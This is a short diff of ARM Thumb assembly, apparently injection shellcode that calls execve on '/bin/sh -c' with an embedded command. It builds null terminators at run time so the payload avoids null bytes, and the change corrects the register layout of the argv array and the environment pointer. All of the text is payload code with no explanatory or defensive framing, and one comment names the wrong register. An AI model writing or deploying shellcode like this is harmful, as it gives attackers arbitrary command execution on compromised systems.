@@ -16,18 +16,19 @@ _start:
     
     .code 16
     // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
-    eor    r2, r2, r2     // r2 = NULL
+    eor    r3, r3, r3     // r3 = NULL
     
     adr    r0, sh         // r0 = "/bin/sh"
-    strb   r2, [r0, #7]   // add null terminator
+    strb   r3, [r0, #7]   // add null terminator
     
     adr    r1, c_arg      // r1 = "-c"
-    strb   r2, [r1, #2]   // add null terminator
+    strb   r3, [r1, #2]   // add null terminator
 
-    adr    r3, cmd        // r3 = cmd
-    strb   r2, [r3, #13]
+    adr    r2, cmd        // r4 = cmd
+    strb   r3, [r2, #13]
     
-    push   {r0, r1, r3, r2}
+    push   {r0, r1, r2, r3}
+    eor    r2, r2, r2     // penv = NULL
     mov    r1, sp         // r1 = argv
     mov    r7, #11        // r7 = execve
     svc    1
